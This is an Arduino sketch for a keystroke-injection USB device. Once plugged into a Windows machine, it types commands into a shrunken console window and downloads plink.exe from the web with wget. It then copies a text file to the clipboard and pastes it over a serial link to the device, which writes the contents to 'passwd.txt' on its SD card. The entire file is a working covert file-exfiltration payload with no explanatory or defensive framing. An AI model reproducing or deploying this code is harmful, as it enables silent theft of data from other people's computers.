#include <SPI.h>
#include <SD.h>
#include "Keyboard.h"

File myFile;
String x;

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
        Serial.begin(9600);     // opens serial port, sets data rate to 9600 bps
        // Begining the Keyboard streamz
        Keyboard.begin();
        // Wait 500ms
        delay(500);
        delay(3000);
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        Keyboard.releaseAll();
      
        delay(500);

        Keyboard.print("cmd /T:F7 /K mode con: cols=20 lines=2 ");
        delay(50);
        typeKey(KEY_RETURN);
        delay(750);
        Keyboard.print("cd C:\\Users\\%USERNAME%\\desktop");
        delay(50);
        typeKey(KEY_RETURN);
        delay(500);
        Keyboard.print("powershell");
        delay(50);
        typeKey(KEY_RETURN);
        delay(50);
        Keyboard.print("wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -OutFile plink.exe");
        delay(50);
        typeKey(KEY_RETURN);
        delay(2000);
        Keyboard.print("cat testas.txt | clip");
        delay(50);
        typeKey(KEY_RETURN);
        delay(50);
        Keyboard.print("./plink.exe -serial COM3");
        typeKey(KEY_RETURN);
        delay(3000);
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press('v');
        delay(50);
        Keyboard.releaseAll();
        Keyboard.end();
        
         // send data only when you receive data:
        if (Serial.available() > 0) {
             Serial.print("Initializing SD card...");
               if (!SD.begin(4)) {
                  Serial.println("initialization failed!");
                  while (1);
                }
                Serial.println("initialization done.");
                // open the file. note that only one file can be open at a time,
                // so you have to close this one before opening another.
                  myFile = SD.open("passwd.txt", FILE_WRITE);
                  
                // read the incoming byte:
                   if (myFile) {
                        Serial.print("Writing to test.txt...");
                         x = Serial.readString();
                        myFile.println(x);
                        // close the file:
                        myFile.close();
                        Serial.println("done.");
                      } else {
                        // if the file didn't open, print an error:
                           Serial.println("error opening test.txt");
                      }

                }
         delay(2000);
         Keyboard.begin();
         Keyboard.press(KEY_LEFT_CTRL);
         Keyboard.press('c');
         delay(50);
         Keyboard.releaseAll();
         Keyboard.print("exit");
         delay(50);
         typeKey(KEY_RETURN);
         delay(300);
         Keyboard.print("exit");
         delay(50);
         typeKey(KEY_RETURN);
         delay(50);
         Keyboard.releaseAll();
         Keyboard.end();
        
      }

void loop() {

 
}
